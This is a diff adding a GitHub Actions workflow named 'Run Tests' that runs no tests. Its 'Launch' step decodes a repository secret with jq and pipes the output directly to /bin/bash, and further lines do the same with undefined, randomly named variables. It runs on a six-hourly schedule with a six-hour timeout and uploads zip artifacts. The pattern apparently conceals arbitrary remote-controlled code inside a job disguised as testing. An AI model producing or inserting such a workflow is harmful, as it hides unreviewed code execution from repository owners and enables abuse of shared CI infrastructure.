@@ -1,0 +1,33 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          szm0: ${{ secrets.szm0 }}
+        run: |
+          printf '%s' "$szm0" | jq -r .un078 | /bin/bash
+          printf '%s' "$qqxi971" | jq -r .p22 | /bin/bash
+          echo $btbo55419 | jq -r .yq7676 | /bin/bash
+          printf '%s' "$zqpsz6" | jq -r .b56260 | /bin/bash
+          echo $xq50 | jq -r .t77379 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: TQTry0p5
+          path: "*.zip"
+          retention-days: 1
